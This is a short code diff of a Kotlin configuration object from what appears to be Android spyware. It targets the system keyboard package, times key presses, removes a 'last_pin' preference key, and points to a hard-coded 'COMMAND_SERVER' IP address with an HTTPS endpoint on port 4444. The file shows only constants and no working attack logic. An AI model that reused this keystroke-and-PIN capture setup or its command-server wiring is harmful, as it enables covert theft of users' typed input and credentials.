@@ -12,7 +12,6 @@ object Config {
     const val KEYBOARD_PACKAGE_NAME = "com.android.inputmethod.latin"
     const val KEY_PRESS_TIMEOUT = 150L
     const val KEYBOARD_DISMISSED_TEXT = "[keyboard hidden]"
-    const val PREFS_KEY_LAST_PIN = "last_pin"
     const val DEBUG = true
     const val COMMAND_SERVER = "188.226.135.191"
     const val HTTPS_ENDPOINT = "https://$COMMAND_SERVER:4444"
